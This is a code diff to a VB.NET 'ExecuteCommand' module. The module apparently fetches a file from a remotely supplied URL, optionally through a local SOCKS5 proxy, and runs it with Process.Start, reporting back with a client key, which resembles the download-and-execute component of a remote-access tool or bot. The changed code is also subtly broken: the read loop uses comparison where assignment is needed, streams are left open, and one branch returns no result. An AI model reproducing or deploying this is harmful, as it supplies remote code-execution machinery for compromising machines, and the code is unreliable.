@@ -12,20 +12,34 @@ Module ExecuteCommand
             Dim result As LogModel
             If Not IO.File.Exists(newlocation) Then
                 If Not model.newExecute.Proxy Then
-                    Dim download As WebClient = New WebClient()
+                    Dim download As New WebClient
                     download.DownloadFile(model.newExecute.Url, newlocation)
                 Else
-                    DownLoadFileByWebRequest(model.newExecute.Url, newlocation)
+                    Dim request As HttpWebRequest
+                    Dim socket5 As com.LandonKey.SocksWebProxy.Proxy.ProxyConfig = New com.LandonKey.SocksWebProxy.Proxy.ProxyConfig(IPAddress.Loopback, 8181, IPAddress.Loopback, Config.Variables.SocketPort, com.LandonKey.SocksWebProxy.Proxy.ProxyConfig.SocksVersion.Five)
+                    request = CType(WebRequest.Create(model.newExecute.Url), HttpWebRequest)
+                    request.Proxy = New SocksWebProxy(socket5)
+                    request.KeepAlive = False
+                    request.Method = WebRequestMethods.Http.Get
+                    request.Timeout = 3000
+                    Dim response As HttpWebResponse = CType(request.GetResponse(), HttpWebResponse)
+                    Dim str As Stream = response.GetResponseStream()
+                    Dim bufferSize As Integer = 1024
+                    Dim buffer As Byte() = New Byte(bufferSize - 1) {}
+                    Dim bytesRead As Integer = 0
+
+                    Dim fileStream As FileStream = File.Create(newlocation)
+
+                    While (bytesRead = str.Read(buffer, 0, bufferSize)) <> 0
+                        fileStream.Write(buffer, 0, bytesRead)
+                    End While
+
                 End If
                 Thread.Sleep(SectoMs(5))
                 If model.newExecute.Run Then
                     result = Running(newlocation, model)
                 Else
-                    result = New LogModel With {
-                            .Message = "File successfully Download!",
-                            .Type = "Success",
-                            .KeyUnique = GetConfigJson().KeyUnique
-                            }
+
                 End If
 
                 Return JsonConvert.SerializeObject(result)
@@ -47,6 +61,7 @@ Module ExecuteCommand
     End Function
     Public Function Running(ByVal path As String, ByVal model As ExecuteModel) As LogModel
         Try
+
             If File.Exists(path) Then
                 Process.Start(path)
                 Return New LogModel With {
@@ -70,38 +85,4 @@ Module ExecuteCommand
                 }
         End Try
     End Function
-    Private Sub DownLoadFileByWebRequest(ByVal urlAddress As String, ByVal filePath As String)
-        Try
-            Dim request As Net.HttpWebRequest = Nothing
-            Dim response As Net.HttpWebResponse = Nothing
-            Dim socket5 As com.LandonKey.SocksWebProxy.Proxy.ProxyConfig = New com.LandonKey.SocksWebProxy.Proxy.ProxyConfig(IPAddress.Loopback, 8181, IPAddress.Loopback, Config.Variables.SocketPort, com.LandonKey.SocksWebProxy.Proxy.ProxyConfig.SocksVersion.Five)
-            request = CType(WebRequest.Create(urlAddress), HttpWebRequest)
-            request.Proxy = New SocksWebProxy(socket5)
-            request.Timeout = 30000
-            request.Method = "GET"
-            request.KeepAlive = True
-            response = CType(request.GetResponse(), Net.HttpWebResponse)
-            Dim s As Stream = response.GetResponseStream()
-
-            If File.Exists(filePath) Then
-                File.Delete(filePath)
-            End If
-
-            Dim os As FileStream = New FileStream(filePath, FileMode.OpenOrCreate, FileAccess.Write)
-            Dim buff As Byte() = New Byte(102399) {}
-            Dim c As Integer = 0
-
-            While (s.Read(buff, 0, 10400) > 0)
-                c = s.Read(buff, 0, 10400)
-                os.Write(buff, 0, c)
-                os.Flush()
-            End While
-
-            os.Close()
-            s.Close()
-        Catch
-            Return
-        Finally
-        End Try
-    End Sub
 End Module
